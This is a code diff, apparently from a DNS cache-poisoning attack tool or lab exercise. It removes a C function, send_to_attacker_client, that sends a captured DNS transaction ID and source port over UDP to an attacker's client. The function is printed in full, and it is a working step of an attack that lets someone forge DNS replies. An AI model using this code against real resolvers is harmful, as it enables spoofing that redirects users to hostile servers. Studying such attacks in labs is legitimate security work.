@@ -111,44 +111,6 @@ int create_dns_response(uint32_t txid, const char* query_name) {
 //##########################################################################################################
 
 
-
-// Function to send TXID and source port to the attacker’s client
-void send_to_attacker_client(uint32_t txid, uint16_t source_port) {
-    printf("send to attacker client\n");
-    struct sockaddr_in client_addr;
-    char message[66];
-
-    // Create a UDP socket
-    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sockfd < 0) {
-        perror("Socket creation failed");
-        return;
-    }
-
-    // Configure the attacker’s client address
-    memset(&client_addr, 0, sizeof(client_addr));
-    client_addr.sin_family = AF_INET;
-    client_addr.sin_port = htons(CLIENT_UDP_PORT); // Set port to 53
-    if (inet_pton(AF_INET, CLIENT_IP, &client_addr.sin_addr) <= 0) {
-        perror("Invalid attacker client IP address");
-        close(sockfd);
-        return;
-    }
-
-    // Prepare the message
-    snprintf(message, sizeof(message), "TXID: %u, Source Port: %u", txid, source_port);
-    
-    // Send the message
-    if (sendto(sockfd, message, strlen(message), 0, (struct sockaddr *)&client_addr, sizeof(client_addr)) < 0) {
-        perror("Failed to send data to attacker’s client");
-    } else {
-        printf("Sent to attacker’s client: %s\n", message);
-    }
-    printf("finished sending to attacker client\n"); 
-    close(sockfd);
-}
-
-
 int even_odd_part(uint32_t txid, struct sockaddr_in client_addr, int* counter, int client_sock){
 
     // CHECK IF THE TXID IS ODD
